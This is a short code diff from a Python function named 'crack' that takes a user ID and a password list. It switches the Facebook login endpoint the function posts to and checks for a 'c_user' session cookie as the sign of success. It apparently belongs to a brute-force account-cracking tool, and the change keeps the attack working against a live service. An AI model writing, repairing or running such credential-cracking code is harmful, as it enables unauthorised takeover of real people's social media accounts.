@@ -345,7 +345,7 @@ def crack(uid, password_list, total_count):
         }
     })
 }
-            respon = Session.post('https://p.facebook.com/async/wbloks/fetch/', params=params, cookies=cookies, headers=headers, data=data)
+            respon = Session.post('https://mbasic.facebook.com/async/wbloks/fetch/', params=params, cookies=cookies, headers=headers, data=data)
             log_cookies = Session.cookies.get_dict().keys()
             # Check response
             if "c_user" in log_cookies:
